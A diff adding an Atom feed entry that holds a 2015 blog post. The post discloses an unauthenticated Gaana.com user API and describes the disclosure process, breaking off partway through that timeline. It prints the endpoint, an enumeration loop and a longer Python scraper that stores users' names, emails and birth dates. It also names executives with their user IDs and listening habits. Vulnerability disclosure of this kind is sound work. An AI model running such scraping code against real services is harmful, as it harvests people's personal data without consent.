@@ -1,0 +1,226 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>blag</title><link href="http://avi.im/blag/" rel="alternate"></link><link href="http://avi.im/blag/feeds/category/code.atom.xml" rel="self"></link><id>http://avi.im/blag/</id><updated>2015-05-23T18:30:00+05:30</updated><entry><title>An exploit on Gaana.com gave me access to their entire User Database</title><link href="http://avi.im/blag/2015/hacking-gaana/" rel="alternate"></link><updated>2015-05-23T18:30:00+05:30</updated><author><name>avi</name></author><id>tag:avi.im,2015-05-12:blag/2015/hacking-gaana/</id><summary type="html">&lt;p&gt;&lt;img alt="What if I told you, that Matrix is real?" src="http://avi.im/blag/images/2015/hacking-gaana/whatif.png" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;EDIT(28/May/2015)&lt;/strong&gt;: You have probably read about Gaana hack in recent news. But this exploit is different than the one found by &lt;a href="http://www.thegeekbyte.com/4841/gaana-com-database-compromised-by-hackers/"&gt;MakMan and g00n&lt;/a&gt;. Mak Man's hack includes SQL Injection, but the vulnerability I found could have been exploited by anyone with a browser and internet connection. No expertise required at all, that's what makes this even more ugly.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;Ever since &lt;a href="http://blog.mclov.in/path-uploads-your-entire-iphone-address-book-to-its-servers-22HGO5EiLJKhWZPKdMOgdw"&gt;Path - iPhone Address Book fiasco&lt;/a&gt; I have developed a habit of doing MITM and checking app's internal APIs. Yesterday I was playing around with &lt;a href="http://gaana.com"&gt;Gaana.com&lt;/a&gt;'s &lt;a href="https://itunes.apple.com/in/app/gaana-unlimited-bollywood/id585270521?mt=8"&gt;app&lt;/a&gt;, I came across this vulnerability. Gaana was started by The Times Group, the same guys behind the national daily newspaper The Times Of India. &lt;/p&gt;
+&lt;p&gt;I came across an internal API which gave me access to their entire user database. Surprisingly, it did not require any cookies, authentication, session id or anything. Anyone with an URL would have had access to Gaana's User DB. &lt;/p&gt;
+&lt;p&gt;I got access to following data of each user:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Full name&lt;/li&gt;
+&lt;li&gt;Profile picture &lt;/li&gt;
+&lt;li&gt;Email address &lt;/li&gt;
+&lt;li&gt;Date of birth&lt;/li&gt;
+&lt;li&gt;Sex&lt;/li&gt;
+&lt;li&gt;Last song they listened on Gaana&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="all the poor users" src="http://avi.im/blag/images/2015/hacking-gaana/all-users-censored.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;Following image shows my personal info on Gaana.com which was accessible to anyone:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="this is me" src="http://avi.im/blag/images/2015/hacking-gaana/me.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;Well, here's &lt;a href="https://archive.is/HEvUv"&gt;proof&lt;/a&gt;. If &lt;s&gt;Archive Today&lt;/s&gt; &lt;a href="http://archive.is"&gt;Archive Is&lt;/a&gt; can access the data then anyone can.&lt;/p&gt;
+&lt;p&gt;The Times Internet CEO Satyan Gajwani's user id on Gaana user database is &lt;code&gt;72&lt;/code&gt; and the last song he listened on Gaana was &lt;em&gt;Happy Birthday&lt;/em&gt; from album &lt;em&gt;Party Time Songs And Nursery Rhymes&lt;/em&gt;. The current Gaana's business head, Pawan Agarwal's user id is &lt;code&gt;831&lt;/code&gt; and the last song he listened on Gaana was &lt;em&gt;Hangover&lt;/em&gt; from movie &lt;em&gt;Kick&lt;/em&gt;. Avinash Mudaliar, the co-founder and former head of Gaana's user id is &lt;code&gt;57&lt;/code&gt;. And The last song he listened on Gaana was &lt;em&gt;Khuda Bhi&lt;/em&gt; from movie &lt;em&gt;Ek Paheli Leela&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;I think I had access to the all the users of Gaana. &lt;strong&gt;Before I got bored, the last record I checked was 11,872,026 (11 Million something) user&lt;/strong&gt;. However not all of data was filled, some profiles were deleted and some had null values.&lt;/p&gt;
+&lt;p&gt;I also got an idea about how they are handling user account deletion. Spoiler alert, even if they have deleted your account, they still retain your profile picture. However I have no idea how do I delete my account. I couldn't find any such option in the app.&lt;/p&gt;
+&lt;h2&gt;The Hack&lt;/h2&gt;
+&lt;p&gt;During normal session, I came across an API which was retrieving user data from Gaana's database:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;api.gaana.com/user.php?type=get_user_object&amp;amp;&amp;amp;user_id=&amp;lt;user_id&amp;gt;&amp;amp;token=&amp;lt;token&amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;above API requires &lt;code&gt;user_id&lt;/code&gt; of the user whose data needs to be accessed and an authentication &lt;code&gt;token&lt;/code&gt; for this transaction. Now in a well designed app, the user should be able make requests only to his account and not to anyone else's. The token, may be, should linked to the user id, generated every time and should authenticate the request. The unique token per session should give access to the unique user. &lt;/p&gt;
+&lt;p&gt;The API call to get my info was:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;http://api.gaana.com/user.php?type=get_user_object&amp;amp;&amp;amp;user_id=11875135&amp;amp;token=d4f9763714ad89e839605e460ef1b4556
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;My first doubt was, why there is even a &lt;code&gt;user_id&lt;/code&gt; field. I am not an expert developer, but if I were designing I wouldn't include &lt;code&gt;user_id&lt;/code&gt; in the API call. The &lt;code&gt;token&lt;/code&gt; should be just enough. And I would regenerate it for every session or make it expire after few hours or something like that. Or I would use OAuth2. And of course, make this communication over TLS/SSL. &lt;/p&gt;
+&lt;p&gt;I copied the above URL and opened it in Browser and it showed my info. Without HTTPS. I have never used or logged into Gaana.com in my browser. So I assumed it's not doing any other validation and using only &lt;code&gt;token&lt;/code&gt;. Though not using HTTPS was worrisome. &lt;/p&gt;
+&lt;p&gt;Then I incremented my &lt;code&gt;user_id&lt;/code&gt; by 1 and sent GET again. Return response status was 200. &lt;/p&gt;
+&lt;p&gt;I wanted to be really sure. So I created a throwaway profile on Gaana. And yes, &lt;a href="https://archive.is/bkuNY"&gt;I was able to access it with same token&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Then I kept on changing &lt;code&gt;user_id&lt;/code&gt; and started sending GETs. It always worked. &lt;/p&gt;
+&lt;p&gt;User 1:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="user1" src="http://avi.im/blag/images/2015/hacking-gaana/user1.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;User 9,99,999:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="user999999" src="http://avi.im/blag/images/2015/hacking-gaana/user999999.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;User 11872026(11 Million something):&lt;/p&gt;
+&lt;p&gt;&lt;img alt="user11872026" src="http://avi.im/blag/images/2015/hacking-gaana/user11872026.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;Several hours had already passed, but still my token was active. I logged out of Gaana app, cleared app data, but it was still working. Then I thought, would it work if I change the token? &lt;a href="https://archive.is/lTAIx"&gt;Entered&lt;/a&gt; some gibberish of same length:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="somerandomtoken" src="http://avi.im/blag/images/2015/hacking-gaana/somerandomtoken.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;Well yeah, it did work. Then another &lt;a href="https://archive.is/wsGC6"&gt;try&lt;/a&gt;, you know, just to be sure:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="somerandomtoken2" src="http://avi.im/blag/images/2015/hacking-gaana/somerandomtoken2.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;Hmm...There's something &lt;a href="https://archive.is/BngCd"&gt;really fishy&lt;/a&gt; was going on. What if I don't provide any &lt;code&gt;token&lt;/code&gt; at all? &lt;/p&gt;
+&lt;p&gt;&lt;img alt="wut" src="http://avi.im/blag/images/2015/hacking-gaana/wut.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;WUT!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;So token wasn't required at all. &lt;/p&gt;
+&lt;p&gt;All you had to was loop through &lt;code&gt;user_id&lt;/code&gt; starting from 1. Following simple four line Python script was enough to fetch all the details of Gaana users.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;span class="n"&gt;api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://api.gaana.com/user.php?type=get_user_object&amp;amp;&amp;amp;user_id={0}&amp;#39;&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SOME_NUM&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;api&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It took me ~50 minutes (used &lt;a href="https://docs.python.org/3/library/time.html#time.time"&gt;&lt;code&gt;time.time()&lt;/code&gt;&lt;/a&gt;) to fetch 10,000 user records:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="frequency" src="http://avi.im/blag/images/2015/hacking-gaana/frequency.png" /&gt;&lt;/p&gt;
+&lt;h3&gt;Bonus:&lt;/h3&gt;
+&lt;p&gt;Following image shows how user deletion is being done on Gaana. Note that the profile picture was valid, so I guess they retain your profile picture even if you delete your account from Gaana. However I have no idea how to delete my account on Gaana. Most probably, I have to contact them to have my account deleted. (which I should do very very soon.) &lt;/p&gt;
+&lt;p&gt;&lt;img alt="a deleted user" src="http://avi.im/blag/images/2015/hacking-gaana/deleteduser.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;p&gt;A random row with null data:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="a null user" src="http://avi.im/blag/images/2015/hacking-gaana/nulluser.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;h2&gt;The Script&lt;/h2&gt;
+&lt;p&gt;Here's the much elaborate script which I had used. However it does not work, but posted it here for educational purposes. If you have some suggestions, improvements, please leave in comments or send me a &lt;a href="http://github.com/avinassh/hacking-gaana"&gt;PR&lt;/a&gt;: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sqlite3&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt;
+
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;peewee&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+
+&lt;span class="n"&gt;users_data_public_api&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://api.gaana.com/user.php?type=get_user_object&amp;amp;&amp;amp;user_id={0}&amp;amp;token=d4f9763714ad89e839605e460ef1b4556&amp;quot;&lt;/span&gt;
+
+
+&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SqliteDatabase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;gaana_users.db&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;GaanaUser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;user_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IntegerField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;fullname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;sex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;dob&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DateField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;lastheardsong&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;initialize_db&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_tables&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;GaanaUser&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;deinit&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_gaana_user_data&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Returns Gaana user data only if he has all the fields required &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;users_data_public_api&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="c"&gt;# print(&amp;quot;got {}&amp;quot;.format(user_id))&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;codes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;user_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;deleted@gaana.com&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;fullname&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;dob&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                    &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;dob&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strptime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+                        &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;dob&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s"&gt;/%m/%Y&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+                &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+                    &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;dob&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;user_data&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;N&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;user_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_gaana_user_data&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="c"&gt;# print(&amp;quot;putting {}&amp;quot;.format(i))&lt;/span&gt;
+            &lt;span class="n"&gt;poor_user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GaanaUser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
+                                  &lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;fullname&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
+                                  &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
+                                  &lt;span class="n"&gt;sex&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;sex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
+                                  &lt;span class="n"&gt;dob&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;dob&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
+                                  &lt;span class="n"&gt;lastheardsong&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;lastheardsong&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+            &lt;span class="n"&gt;poor_user&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+        &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;initialize_db&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+    &lt;span class="n"&gt;deinit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Aftermath&lt;/h2&gt;
+&lt;p&gt;Here is the entire chain of events:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;I found the exploit on 12/May/2015, ~3.30 PM. By 4.30 PM, I was convinced that Gaana had a vulnerability. I Googled for their security team email, searched if they have Bug Bounty Programmes. But neither I found any email or Bug Bounty programmes on Gaana. Gaana did not have any 'Contact Us' in their website footer. &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;I tweeted them on Twitter and waited for response:&lt;/p&gt;
+&lt;p&gt;&lt;blockquote class="twitter-tweet" lang="en"&gt;&lt;p lang="en" dir="ltr"&gt;&lt;a href="https://twitter.com/gaana"&gt;@gaana&lt;/a&gt; lets say hypothetically some1 hacked ur server &amp;amp; got access. Hw should they go abut contacting ur security team? security@gaana.com?&lt;/p&gt;&amp;mdash; avi (@iavins) &lt;a href="https://twitter.com/iavins/status/598088551394189312"&gt;May 12, 2015&lt;/a&gt;&lt;/blockquote&gt;&lt;script async src="http://platform.twitter.com/widgets.js" charset="utf-8"&gt;&lt;/script&gt;&lt;/p&gt;
+&lt;p&gt;They were active on Twitter, replying to others. But did not reply to me. May be they thought I was pulling some prank. Also, I did find a contact form on their website after bit of searching(to which they responded after three days).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;I tweeted again in night:&lt;/p&gt;
+&lt;p&gt;&lt;blockquote class="twitter-tweet" lang="en"&gt;&lt;p lang="en" dir="ltr"&gt;&lt;a href="https://twitter.com/gaana"&gt;@gaana&lt;/a&gt; guys, can you tell me how do I get in touch with your security/bugs team?&lt;/p&gt;&amp;mdash; avi (@iavins) &lt;a href="https://twitter.com/iavins/status/598166155736457216"&gt;May 12, 2015&lt;/a&gt;&lt;/blockquote&gt;&lt;script async src="//platform.twitter.com/widgets.js" charset="utf-8"&gt;&lt;/script&gt;&lt;/p&gt;
+&lt;p&gt;And they finally replied to me next day and asked me to DM, which &lt;a href="http://avi.im/blag/images/2015/hacking-gaana/dm.png"&gt;I did&lt;/a&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Finally their dev emailed on May 13th evening and I sent him all the details, including SQL dump (so that he takes me seriously):&lt;/p&gt;
+&lt;p&gt;&lt;img alt="first email" src="http://avi.im/blag/images/2015/hacking-gaana/firstemail.png" width="99%" height="99%" /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;On May 17th (i.e. 5 days after the exploit), I emailed them again asking why it wasn't fixed yet. Their site was up and running, but exploit wasn't fixed. I was worried if someone else figures this out and makes the data public.&lt;/p&gt;
+&lt;p&gt;Their developer called me again and assured me that it will be fixed soon and it's taking time because of API backward compatibility issues.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Sometime on May 23-24rd (i.e. ~10 days after exploit) the vulnerability was partially fixed. Now you were able to get full name and profile pic. However API was still openly accessible, over HTTP, in the browser:&lt;/p&gt;
